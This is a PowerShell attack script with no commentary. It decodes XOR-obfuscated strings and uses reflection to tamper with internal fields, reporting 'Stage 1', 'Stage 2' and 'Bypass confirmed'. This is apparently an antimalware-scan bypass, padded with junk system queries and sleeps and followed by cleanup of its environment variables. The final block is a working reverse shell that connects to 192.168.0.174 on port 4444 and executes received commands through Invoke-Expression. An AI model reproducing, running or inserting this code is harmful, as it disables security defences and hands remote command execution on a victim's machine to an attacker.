$env:UeOZZKZK = "ovGU8YXxp/GQ8Z3xhPGU8Q=="
$env:bXvoIxlV = "ufG68bTxqPGu8b3xvvGy8bDxvfGu8bzxsPGy8bnxuPG/8bTxrfGi8b7xt/Gl8abxsPGj8bTxrfGh8Z7xnfGY8ZLxmPGU8YLxrfG88ZjxkvGD8Z7xgvGe8ZfxhfGt8abxmPGf8ZXxnvGG8YLxrfGh8Z7xhvGU8YPxovGZ8ZTxnfGd8a3xovGS8YPxmPGB8YXxs/Gd8Z7xkvGa8b3xnvGW8ZbxmPGf8Zbx"
$env:jwgpJzWe = "tPGf8ZDxk/Gd8ZTxovGS8YPxmPGB8YXxs/Gd8Z7xkvGa8b3xnvGW8ZbxmPGf8Zbx"
$env:D8OTwekq = "tvGU8YXxpfGI8YHxlPE="
$env:NK6MzsUY = "kPGc8YLxmPG48Z/xmPGF8bfxkPGY8Z3xlPGV8Q=="
$env:XWf9bEmj = "kvGQ8ZLxmfGU8ZXxtvGD8Z7xhPGB8aHxnvGd8ZjxkvGI8aLxlPGF8YXxmPGf8ZbxgvE="
$env:dfchAliV = "tvGU8YXxt/GY8ZTxnfGV8Q=="
$env:d2cLFtV9 = "tvGU8YXxp/GQ8Z3xhPGU8Q=="
$env:LmVzIxoJ = "ovGI8YLxhfGU8Zzx3/G88ZDxn/GQ8ZbxlPGc8ZTxn/GF8d/xsPGE8YXxnvGc8ZDxhfGY8Z7xn/Hf8aTxhfGY8Z3xgvE="
$env:ivZfOfib = "ovGI8YLxhfGU8Zzx3/G88ZDxn/GQ8ZbxlPGc8ZTxn/GF8d/xsPGE8YXxnvGc8ZDxhfGY8Z7xn/Hf8bDxnPGC8ZjxpPGF8ZjxnfGC8Q=="

function fMiGl($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=$b[$i] -bxor 241};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$kpl = fMiGl 'D8OTwekq'
$avf = fMiGl 'dfchAliV'
$n1b = fMiGl 'UeOZZKZK'
$gy5 = fMiGl 'd2cLFtV9'
$wsg = [System.Reflection.BindingFlags]((0x5C -bxor 0x7C) + (0x56 -bxor 0x5E))

$t6f = fMiGl 'ivZfOfib'
$pi6 = $null
foreach ($g4u in [AppDomain]::CurrentDomain.GetAssemblies()) {
  if ($g4u.$kpl($t6f) -ne $null) { $pi6 = $g4u; break }
}

try {
  $null = [Environment]::ProcessorCount
  Start-Sleep -Milliseconds 96
  $null = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Name

  try {
    $fmp = fMiGl 'LmVzIxoJ'
    $rok = $pi6.$kpl($fmp)
    $erp = fMiGl 'XWf9bEmj'
    $r03 = fMiGl 'bXvoIxlV'
    $a91 = $rok.$avf($erp, $wsg)
    $vrw = fMiGl 'jwgpJzWe'
    $eib = $a91.$gy5($null)
    if ($eib -eq $null) {
      $eib = @{}
      $a91.$n1b($null, $eib)
    }
    $srs = New-Object "System.Collections.Generic.Dictionary[string,object]"
    $srs.Add($vrw, 0)
    $eib[$r03] = $srs
    $wcm = $a91.$gy5($null)
    if ($wcm -ne $null -and $wcm.ContainsKey($r03) -and $wcm[$r03][$vrw] -eq 0) {
      Write-Host '[+] Stage 1 OK'
    } else {
      Write-Host '[!] Stage 1 failed'
    }
  } catch {
    Write-Host '[!] Stage 1 failed'
  }


  Start-Sleep -Milliseconds 131
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue
  $null = [Environment]::OSVersion.Version

  try {
    $i7u = fMiGl 'ivZfOfib'
    $xy1 = $pi6.$kpl($i7u)
    $crg = fMiGl 'NK6MzsUY'
    $bzg = [System.DateTime]::Now.Ticks
    $exn = $xy1.$avf($crg, $wsg)
    $exn.$n1b($null, $true)
    $oj2 = $exn.$gy5($null)
    if ($oj2 -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $ahm = fMiGl 'ivZfOfib'
    $xek = $pi6.$kpl($ahm)
    if ($xek -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }
}
finally {
  Remove-Item Env:\D8OTwekq -ErrorAction SilentlyContinue
  Remove-Item Env:\dfchAliV -ErrorAction SilentlyContinue
  Remove-Item Env:\UeOZZKZK -ErrorAction SilentlyContinue
  Remove-Item Env:\d2cLFtV9 -ErrorAction SilentlyContinue
  Remove-Item Env:\ivZfOfib -ErrorAction SilentlyContinue
  Remove-Item Env:\NK6MzsUY -ErrorAction SilentlyContinue
  Remove-Item Env:\LmVzIxoJ -ErrorAction SilentlyContinue
  Remove-Item Env:\XWf9bEmj -ErrorAction SilentlyContinue
  Remove-Item Env:\bXvoIxlV -ErrorAction SilentlyContinue
  Remove-Item Env:\jwgpJzWe -ErrorAction SilentlyContinue
}
        # Reverse shell execution
        try {
            $LHOST = "192.168.0.174"; 
            $LPORT = 4444; 
            $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
            $NetworkStream = $TCPClient.GetStream(); 
            $StreamReader = New-Object IO.StreamReader($NetworkStream); 
            $StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
            $StreamWriter.AutoFlush = $true; 
            $Buffer = New-Object System.Byte[] 1024; 
            while ($TCPClient.Connected) { 
                while ($NetworkStream.DataAvailable) { 
                    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
                    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
                }; 
                if ($TCPClient.Connected -and $Code.Length -gt 1) { 
                    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
                    $StreamWriter.Write("$Output`n"); 
                    $Code = $null 
                } 
            }; 
            $TCPClient.Close(); 
            $NetworkStream.Close(); 
            $StreamReader.Close(); 
            $StreamWriter.Close()
        } catch {
            Write-Host "[!] Reverse shell connection failed"
        }
        